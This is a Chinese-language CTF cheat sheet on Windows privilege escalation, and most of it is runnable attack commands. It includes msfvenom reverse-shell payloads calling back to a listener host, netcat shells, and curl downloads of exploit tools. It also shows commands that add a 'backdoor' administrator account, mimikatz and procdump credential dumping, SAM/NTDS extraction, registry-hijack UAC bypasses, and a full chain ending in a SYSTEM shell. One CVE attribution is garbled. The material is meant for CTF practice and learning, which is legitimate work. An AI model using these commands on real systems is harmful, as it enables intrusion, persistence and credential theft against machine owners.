---
category: "Windows权限提升"
tags: ["Windows提权", "服务提权", "令牌窃取", "UAC绕过", "未引用服务路径", "PrintSpoofer", "Potato家族", "CTF"]
difficulty: "高级"
---

# Windows权限提升

## 1. 概述

Windows权限提升是内网渗透和CTF Attack-Defense中的关键环节。与Linux环境相比，Windows的权限模型更复杂——除了传统的用户/组机制外，还包括UAC（用户账户控制）、令牌（Token）、完整性级别（Integrity Level）等多层保护机制。本节覆盖服务权限配置错误、令牌窃取、Potato系列提权、UAC绕过、内核漏洞等Windows环境下的主流提权技术。

## 2. 核心原理

### 2.1 Windows权限体系

```
SYSTEM (最高权限，类似Linux root)
  │
Administrator (管理员，UAC限制)
  │
High Integrity (高完整性级别，管理员运行)
  │
Medium Integrity (普通用户)
  │
Low Integrity (受限，如IE保护模式)
  │
Untrusted (最低)
```

**关键概念：**
- **访问令牌 (Access Token):** 包含用户的SID、组SID和特权列表
- **特权 (Privileges):** SeDebugPrivilege, SeImpersonatePrivilege等
- **完整性级别 (Integrity Level):** System > High > Medium > Low
- **UAC:** 即使Administrator也需要提升确认
- **服务账户:** LocalSystem (SYSTEM), NetworkService, LocalService

### 2.2 提权向量分类

```
1. 服务配置缺陷类
   ├── 未引用服务路径 (Unquoted Service Path)
   ├── 可写的服务二进制文件
   ├── 可修改的服务配置
   └── 服务注册表权限问题

2. 权限滥用类
   ├── SeImpersonatePrivilege (Potato系列)
   ├── SeDebugPrivilege
   ├── SeBackupPrivilege
   ├── SeRestorePrivilege
   └── SeTakeOwnershipPrivilege

3. 计划任务类
   ├── 可写的计划任务脚本
   └── 计划任务以SYSTEM身份执行

4. UAC绕过
   ├── 注册表劫持
   ├── DLL劫持
   └── 模拟信任路径

5. 内核漏洞
   ├── PrintSpoofer (CVE-2022-21999)
   ├── EternalBlue本地版
   └── 各类Windows内核LPE CVE

6. 凭据类
   ├── 存储的凭据 (cmdkey, Credential Manager)
   ├── LSASS内存中的密码
   ├── 自动登录注册表项
   └── AlwaysInstallElevated
```

## 3. 权限提升方法与命令

### 3.1 提权前信息枚举

```powershell
# ===== 基础系统信息 =====
whoami
whoami /priv         # 当前用户特权（最重要！）
whoami /groups       # 组成员
systeminfo | findstr /i "OS Name Version Hotfix KB"  # 系统信息+补丁
hostname
echo %username%
echo %USERDOMAIN%
ver

# ===== 网络信息 =====
ipconfig /all
route print
netstat -ano
arp -a
netstat -anob  # 需要管理员权限（显示进程名）

# ===== 用户与组 =====
net user
net user Administrator
net localgroup
net localgroup Administrators
net group "Domain Admins" /domain  # 域环境下
whoami /all

# ===== 特权检查 =====
# 关键特权：
# SeImpersonatePrivilege   - 模拟令牌 → Potato系列
# SeAssignPrimaryTokenPrivilege - 分配主令牌
# SeDebugPrivilege         - 调试进程 → 注入SYSTEM进程
# SeBackupPrivilege        - 备份 → 读取任意文件
# SeRestorePrivilege       - 恢复 → 写入任意文件
# SeTakeOwnershipPrivilege - 取得所有权
# SeTcbPrivilege           - 相当于SYSTEM
# SeLoadDriverPrivilege    - 加载驱动
whoami /priv

# ===== 服务信息 =====
sc query state= all | findstr "SERVICE_NAME"
wmic service get name,displayname,pathname,startmode,startname | findstr /i "auto"
Get-Service | Where-Object {$_.Status -eq "Running"}
# 关键：查找以SYSTEM运行的服务，特别是可写或未引用路径的

# ===== 计划任务 =====
schtasks /query /fo LIST /v | findstr /i "TaskName Next Run Time"
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}

# ===== 自动安装与启动 =====
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# ===== AlwaysInstallElevated =====
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 两者都为1时 → 可以用msiexec以SYSTEM权限安装msi

# ===== UAC状态 =====
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# ===== 存储的凭据 =====
cmdkey /list
# 如果有存储凭据 → runas /savecred
vaultcmd /list
# Windows凭据管理器

# ===== 无人值守安装文件 =====
dir /s /b Unattend.xml
dir /s /b sysprep.inf
dir /s /b sysprep.xml
# 可能包含Base64编码的管理员密码

# ===== 可写路径 =====
accesschk.exe -wvu * C:\   # AccessChk from SysInternals
icacls "C:\Program Files" | findstr /i "Everyone BUILTIN\Users"
icacls "C:\Program Files (x86)" | findstr /i "Everyone BUILTIN\Users"

# ===== PowerShell历史 =====
Get-History
Get-PSReadlineOption | Select-Object HistorySavePath
type (Get-PSReadLineOption).HistorySavePath
# 可能包含密码

# 自动化工具
# WinPEAS (Windows版LinPEAS)
# .\winPEASx64.exe
# .\winPEASany.exe quiet
# Seatbelt (C#)
# .\Seatbelt.exe -group=all
# PowerUp (PowerShell)
# . .\PowerUp.ps1; Invoke-AllChecks
# Watson (缺失补丁检查)
# .\Watson.exe
```

### 3.2 服务权限配置错误

**未引用服务路径 (Unquoted Service Path)**
```bash
# 原理：如果服务路径包含空格且没有用引号括起来
# 如: C:\Program Files\My App\service.exe
# Windows会依次尝试:
#   1. C:\Program.exe
#   2. C:\Program Files\My.exe
#   3. C:\Program Files\My App\service.exe

# 检测
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """
Get-WmiObject -Class Win32_Service | Where-Object {$_.StartMode -eq "Auto" -and $_.PathName -notlike '"*"*' -and $_.PathName -notlike "C:\Windows*"} | Select Name,DisplayName,PathName,StartName

# 利用条件：对路径中间目录有写入权限
# 如果服务路径: C:\Program Files\MyApp\service.exe
# 且 C:\Program Files\MyApp\ 下有一个空格路径
# 实际路径: C:\Program Files\My App\service.exe (有空格)
# 则尝试写入: C:\Program Files\My.exe

# 生成payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 \
         -f exe -o My.exe

# 上传并放置到合适的路径
copy My.exe "C:\Program Files\My.exe"
# 或使用PowerShell
sc.exe stop VulnerableService
sc.exe start VulnerableService
# 服务重启时执行C:\Program Files\My.exe → SYSTEM shell
```

**可写的服务二进制文件：**
```bash
# 检测可写的服务exe
icacls "C:\Program Files\VulnerableApp\service.exe"
# 输出: BUILTIN\Users:(F) → 所有用户完全控制！
#       Everyone:(F)

# 利用
# 1. 备份原文件
copy "C:\Program Files\VulnerableApp\service.exe" "C:\Temp\service.exe.bak"

# 2. 替换为反向Shell
copy malicious.exe "C:\Program Files\VulnerableApp\service.exe" /Y

# 3. 重启服务
net stop VulnerableService
net start VulnerableService
# 或
sc.exe stop VulnerableService
sc.exe start VulnerableService

# 4. 获得SYSTEM shell后恢复原文件
copy "C:\Temp\service.exe.bak" "C:\Program Files\VulnerableApp\service.exe" /Y
```

**可修改服务配置：**
```bash
# 检测当前用户可修改的服务
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %username% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula

# 修改服务路径
sc.exe config VulnerableService binPath= "C:\Temp\reverse.exe"
sc.exe start VulnerableService
# 或
sc.exe config VulnerableService binPath= "cmd.exe /c net user backdoor Password123! /add && net localgroup Administrators backdoor /add"
sc.exe start VulnerableService
```

### 3.3 SeImpersonatePrivilege — Potato家族

当用户拥有SeImpersonatePrivilege（通常是IIS服务账户、SQL Server服务账户等）时，可以利用NTLM反射攻击欺骗SYSTEM令牌。

```bash
# 确认特权
whoami /priv | findstr /i "SeImpersonatePrivilege"
# 或
whoami /priv | findstr /i "SeAssignPrimaryToken"

# === PrintSpoofer (适用于Windows 10/Server 2016/2019) ===
# 前提：SeImpersonatePrivilege
PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -c "nc.exe 10.10.10.100 4444 -e cmd.exe"

# === RoguePotato (最新，适用于Windows 10 1809+/Server 2019+) ===
RoguePotato.exe -r 10.10.10.100 -e "C:\Temp\reverse.exe" -l 9999

# === SweetPotato ===
SweetPotato.exe -p C:\Temp\reverse.exe

# === JuicyPotato (适用于较老版本：Windows 7/8/10 <1803) ===
# 选择CLSID（与系统版本匹配）
# CLSID列表: https://github.com/ohpe/juicy-potato/tree/master/CLSID
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe \
    -a "/c C:\Temp\reverse.exe" -t * \
    -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}  # 合适的CLSID

# === GodPotato ===
GodPotato.exe -cmd "C:\Temp\reverse.exe"

# === 批量尝试多个CLSID的脚本 ===
@echo off
setlocal EnableDelayedExpansion
set "CLSIDS=CLSID1 CLSID2 CLSID3 ..."
for %%c in (%CLSIDS%) do (
    echo [*] Trying CLSID: %%c
    JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami > C:\Temp\result.txt" -t * -c %%c
    timeout /t 2 >nul
    if exist C:\Temp\result.txt (
        type C:\Temp\result.txt
        del C:\Temp\result.txt
    )
)
```

**Potato家族适用场景速查表：**

| 工具 | Windows版本 | 额外条件 | 优先级 |
|------|------------|---------|--------|
| PrintSpoofer | Win10/Server2016+ | 命名管道可用 | 高 |
| GodPotato | Win8-Win11 | COM/WinHTTP | 最高 |
| RoguePotato | Win10 1809+/Server2019+ | 需要攻击者机器 | 中 |
| SweetPotato | Win7-Win11/Server2008-2022 | 多种触发器 | 高 |
| JuicyPotato | Win7-Win10 1803 | 仅限BITS CLSID | 低（已过时） |
| RogueWinRM | Win10/Server2019+ | WinRM服务 | 中 |
| EfsPotato | Win7-Win10 | EFS服务 | 低 |

### 3.4 其他特权滥用

```bash
# === SeDebugPrivilege ===
# 可以调试和注入任意进程（包括SYSTEM进程）
# 使用ProcDump或自定义工具
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# 或使用Mimikatz直接
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# 可以通过注入winlogon.exe获取SYSTEM shell
# 条件是whoami /priv显示SeDebugPrivilege为Enabled

# === SeBackupPrivilege + SeRestorePrivilege ===
# 可以读取任意文件（如SAM/SYSTEM注册表）
reg save hklm\sam C:\Temp\sam.save
reg save hklm\system C:\Temp\system.save
# 使用secretsdump.py提取哈希
secretsdump.py -sam sam.save -system system.save LOCAL

# 也可直接复制NTDS.dit (域控)
robocopy /b C:\Windows\NTDS\ C:\Temp\

# === SeTakeOwnershipPrivilege ===
# 可以取得任意文件所有权
takeown /f C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SAM /grant %username%:F

# === SeRestorePrivilege + 服务注册表修改 ===
# 可以修改注册表中的服务配置
# 修改某个SYSTEM服务的ImagePath为恶意exe，重启服务获得SYSTEM

# === SeLoadDriverPrivilege ===
# 可以加载内核驱动
# 加载Capcom.sys等已知漏洞驱动进行内核级利用
# 使用EoPLoadDriver加载恶意驱动
```

### 3.5 UAC绕过

UAC绕过允许从Medium Integrity提升到High Integrity（admin权限但不一定是SYSTEM）。

```bash
# === UAC状态检测 ===
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
# 1 → UAC开启
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0 = 不提示, 2 = 在安全桌面提示(默认), 5 = 提示凭据

# === 方法1: fodhelper UAC绕过 (Win10/11) ===
# 利用注册表劫持fodhelper.exe的启动参数
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Temp\reverse.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
fodhelper.exe
# reverse.exe会以高完整性级别执行

# === 方法2: ComputerDefaults UAC绕过 ===
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Temp\reverse.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
ComputerDefaults.exe

# === 方法3: eventvwr.exe UAC绕过 ===
# 利用事件查看器的注册表键
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "C:\Temp\reverse.exe" /f
eventvwr.exe

# === 方法4: sdclt.exe UAC绕过 ===
# 利用备份和还原中心的DLL劫持

# === 方法5: 模拟可执行自动提升 ===
# 如果存在自动提升的exe（清单中autoElevate=true）
# 且其DLL搜索路径可写 → DLL劫持

# === 绕过验证工具 ===
# UACMe (多个方法的集合)
# https://github.com/hfiref0x/UACME
# akagi32.exe 33 C:\Temp\reverse.exe   # fodhelper方法
# akagi64.exe 61 C:\Temp\reverse.exe   # 某个方法
```

### 3.6 AlwaysInstallElevated

```bash
# 检测
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 两者必须都为 0x1

# 利用
# 1. 生成MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 \
         -f msi -o reverse.msi

# 2. 安装（将以SYSTEM权限安装）
msiexec /quiet /qn /i C:\Temp\reverse.msi

# 3. 或直接用命令行添加管理员
# 生成可以添加用户的MSI
msfvenom -p windows/exec CMD="net user backdoor Password123! /add && net localgroup Administrators backdoor /add" -f msi -o adduser.msi
msiexec /quiet /qn /i C:\Temp\adduser.msi
```

### 3.7 注册表Run键提权

```bash
# 检查可写的HKLM Run键
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
icacls "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# 如果可写（罕见但可能），添加启动项
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Update" /t REG_SZ /d "C:\Temp\reverse.exe" /f

# 下一次管理员登录时触发（或系统重启后）

# 同样检查HKCU Run键（获取用户级持久化）
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### 3.8 Startup文件夹提权

```bash
# 检查Startup文件夹权限
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# 如果ALL APPLICATION PACKAGES或Users有写入权限

# 写入快捷方式或exe
copy reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
# 用户登录时执行
```

### 3.9 Windows内核漏洞提权

```bash
# === Watson — Windows缺失补丁检查 ===
Watson.exe
# 列出缺失的补丁和对应的CVE

# 或者手动检查
systeminfo | findstr /i "KB"
wmic qfe get Caption,Description,HotFixID,InstalledOn

# === PrintSpoofer (不是Potato的那个，是打印驱动漏洞) ===
# CVE-2022-21999, CVE-2022-22718 等

# === 常见Windows内核LPE ===
# CVE-2022-21882 - Win32k LPE (Windows 10 1809-21H2)
# CVE-2021-1732 - Win32k LPE (Windows 10 1903-20H2)
# CVE-2021-40449 - Win32k LPE (Windows 7-10, Server 2008-2022)
# CVE-2020-0787 - Background Intelligent Transfer Service
# CVE-2019-0841 - Windows AppX Deployment Service
# CVE-2018-8120 - Win32k LPE

# 使用预编译的exploit集合
# Windows-Exploit-Suggester
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2024-01-01-mssb.xlsx --systeminfo systeminfo.txt

# Sherlock (PowerShell)
powershell -ep bypass
. .\Sherlock.ps1
Find-AllVulns
```

## 4. 自动化提权工具使用

```bash
# === 枚举阶段 ===
# WinPEAS
winPEASx64.exe
winPEASany.exe quiet cmd
# 输出非常全面，包含颜色编码

# Seatbelt
Seatbelt.exe -group=system
Seatbelt.exe -group=user -group=system -group=all

# PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"

# PowerUp
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
# PowerUp还包含特定检查
powershell -ep bypass -c ". .\PowerUp.ps1; Get-UnquotedService"
powershell -ep bypass -c ". .\PowerUp.ps1; Get-ModifiableServiceFile"
powershell -ep bypass -c ". .\PowerUp.ps1; Get-ServiceDetail -ServiceName ServiceName"

# === 利用阶段 ===
# PowerUp也可以直接利用
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-ServiceAbuse -ServiceName VulnerableService -Command 'C:\Temp\reverse.exe'"

# Watson
Watson.exe

# BeRoot
beRoot.exe

# JAWS (Just Another Windows (Enum) Script)
powershell -ep bypass -c ". .\jaws-enum.ps1;"
```

## 5. 实战示例

### 5.1 完整Windows提权链

**场景：** 通过Web漏洞获得IIS AppPool\DefaultAppPool账户的Shell，需要提权到SYSTEM获取Flag。

```bash
# === 阶段1: 初始枚举 ===
whoami
# IIS APPPOOL\DefaultAppPool (Medium Integrity)

whoami /priv
# 发现: SeImpersonatePrivilege - Enabled  ← 关键！

systeminfo
# Windows Server 2019 Standard 10.0.17763

Get-Service | Where-Object {$_.Status -eq "Running"} | Select Name

# === 阶段2: SeImpersonatePrivilege利用 ===
# 选择PrintSpoofer (Server 2019兼容)
# 生成payload
# 在攻击机: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 -f exe -o rev.exe

# 上传PrintSpoofer64.exe和rev.exe
curl http://10.10.10.100:8000/PrintSpoofer64.exe -o C:\Temp\ps.exe
curl http://10.10.10.100:8000/rev.exe -o C:\Temp\rev.exe

# 执行
C:\Temp\ps.exe -c "C:\Temp\rev.exe"

# 监听器收到连接
nc -lvnp 4444
whoami
# nt authority\system ← 成功！

# === 阶段3: Flag获取 ===
type C:\Users\Administrator\Desktop\flag.txt
# CTF{PrintSpoofer_Win_PrivEsc_EZ}

# === 备选路线: 如果SeImpersonate不够 ===
# 检查AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 0x1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 0x1

# 生成MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=5555 -f msi -o priv.msi

# 上传并安装
curl http://10.10.10.100:8000/priv.msi -o C:\Temp\priv.msi
msiexec /quiet /qn /i C:\Temp\priv.msi

# 另一个监听器获得SYSTEM shell
```

### 5.2 未引用服务路径 + DLL劫持组合

```bash
# 枚举发现未引用服务路径
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """
# VulnService  C:\Program Files\Vuln Co\service.exe  Auto

# icacls检查
icacls "C:\Program Files"
# BUILTIN\Users:(RX,W) → 可写！

# 生成payload
msfvenom -p windows/x64/exec CMD="cmd.exe /c net user backdoor Password123! /add && net localgroup administrators backdoor /add" -f exe -o Vuln.exe

# 上传并放置
copy Vuln.exe "C:\Program Files\Vuln.exe"

# 触发
sc stop VulnService
sc start VulnService
# 或 reboot (需要SeShutdownPrivilege)

# 验证
net localgroup administrators
# 包含backdoor → 提权成功！
```

### 5.3 令牌窃取（Meterpreter高级用法）

```ruby
# 如果已获得Meterpreter会话
meterpreter > getuid
# Server username: NT AUTHORITY\NETWORK SERVICE

meterpreter > getsystem
# 自动尝试多种方法（命名管道令牌模拟、服务安装等）
# ...got system via technique 1 (Named Pipe Impersonation).
# Server username: NT AUTHORITY\SYSTEM

# 或者手动操作
meterpreter > use incognito
meterpreter > list_tokens -u
# 发现SYSTEM令牌
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
meterpreter > getuid
# NT AUTHORITY\SYSTEM

# 使用Kiwi (Mimikatz集成)
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > kiwi_cmd sekurlsa::pth /user:Administrator /domain:WORKGROUP /ntlm:<hash> /run:cmd.exe
```

## 6. 常见误区与注意事项

- **误区1：获得Administrator就等于提权完成。** 在UAC启用的情况下，Administrator仍处于Medium Integrity，需要进一步绕过UAC或利用SeImpersonate获取SYSTEM。
- **误区2：只在C:\考虑未引用服务路径。** 第三方软件安装在D:\, E:\等盘符下也可能存在未引用服务路径。
- **误区3：Potato工具需要尝试多个。** 不同Windows版本/补丁级别有不同的CLSID有效性，不要因为一个Potato失败就放弃。
- **误区4：忘记检查PowerShell历史。** Get-PSReadlineOption可以暴露大量有价值的命令历史和可能的密码。
- **注意：使用Mimikatz等工具可能被Windows Defender检测。在CTF中通常Defender禁用或预先加了白名单。**
- **注意：一些提权操作（如服务重启）会导致服务中断，在A/D模式中可能影响防御。**

## 7. 相关知识点

- **AccessChk (SysInternals):** 检查文件/注册表权限的最佳工具
- **Procmon (SysInternals):** 监控进程操作，找出权限问题
- **Process Hacker:** 功能更强的任务管理器，查看/操纵令牌
- **Rubeus:** Kerberos相关操作，包含ticket提取和PTT
- **PowerUpSQL:** SQL Server权限提升专用
- **LOLBAS (Living Off the Land Binaries and Scripts):** Windows自带工具利用
- **Kernel Exploit编译环境:** 需要匹配Visual Studio版本和SDK
